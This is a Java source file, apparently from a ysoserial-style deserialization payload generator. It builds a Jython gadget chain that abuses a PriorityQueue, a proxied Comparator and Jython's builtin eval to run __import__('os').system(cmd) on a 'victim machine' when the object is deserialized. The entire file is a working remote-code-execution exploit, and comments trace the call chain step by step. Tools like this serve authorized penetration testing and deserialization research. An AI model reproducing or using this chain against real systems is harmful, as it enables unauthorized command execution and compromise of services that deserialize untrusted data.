package com.ppp.chain.jython;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.python.core.PyMethod;
import org.python.core.PyObject;
import org.python.core.PyString;
import org.python.core.PyStringMap;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;

/**
 * Credits: Steven Seeley (@steventseeley) and Rocco Calvi (@TecR0c)
 * Thanks to Alvaro Munoz (@pwntester) for the InvocationHandler tekniq!
 * <p>
 * This version of Jython2 executes python2 code on the victim machine. Note that we are in a Py.eval here
 * so if you want to jump to native python2 code you will need to move to Py.exec and to do that you can use
 * `__import__('code').InteractiveInterpreter().runcode(<python2 code>)` instead.
 * <p>
 * java.io.ObjectInputStream.readObject
 * java.util.PriorityQueue.readObject
 * java.util.PriorityQueue.heapify
 * java.util.PriorityQueue.siftDownUsingComparator
 * com.sun.proxy.$Proxy4.compare
 * org.python.core.PyMethod.invoke
 * org.python.core.PyMethod.__call__
 * org.python.core.PyMethod.instancemethod___call__
 * org.python.core.PyObject.__call__
 * org.python.core.PyBuiltinFunctionNarrow.__call__
 * org.python.core.BuiltinFunctions.__call__
 * org.python.core.__builtin__.eval
 * org.python.core.Py.runCode
 */
@Dependencies({"org.python:jython-standalone:2.7.3"})
@Authors({Authors.SSEELEY, Authors.RCALVI})
@Sink({Sink.Python})
public class Jython3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Jython3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
//        // sink
//        Object sinkObject = SinkScheduler.builder(sinksHelper);

        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        Object builtin = Reflections.newInstance("org.python.core.BuiltinFunctions", "rce", 18, 1);
        PyMethod handler = new PyMethod((PyObject) builtin, null, new PyString().getType());
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, (InvocationHandler) handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        HashMap<Object, PyObject> myargs = new HashMap<Object, PyObject>();
        myargs.put("cmd", new PyString(command));
        PyStringMap locals = new PyStringMap(myargs);
        Object[] queue = new Object[]{
                new PyString("__import__('os').system(cmd)"), // attack
                locals,                                       // context
        };
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }
}
